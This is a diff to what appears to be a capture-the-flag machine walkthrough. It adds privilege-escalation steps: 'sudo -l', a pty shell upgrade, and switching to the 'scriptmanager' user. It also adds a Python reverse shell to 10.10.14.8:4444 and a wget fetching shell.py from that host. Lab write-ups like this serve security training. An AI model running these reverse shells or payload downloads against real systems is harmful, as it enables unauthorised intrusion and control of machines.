@@ -28,8 +28,21 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 
 ```
+sudo -l
+```
+```
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 ```
 sudo -u scriptmanager bash -i
 ```
+![image](https://user-images.githubusercontent.com/33616880/231083178-a2ff7d4c-fbbf-4701-885e-399f0a2bd732.png)
+![image](https://user-images.githubusercontent.com/33616880/231083338-54eabf9e-3306-488f-800c-b2ac046a8175.png)
+
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+```
+wget 10.10.14.8/shell.py
+```
+![image](https://user-images.githubusercontent.com/33616880/231084808-1b28d08b-1c89-46bd-9d76-3770e62233fc.png)
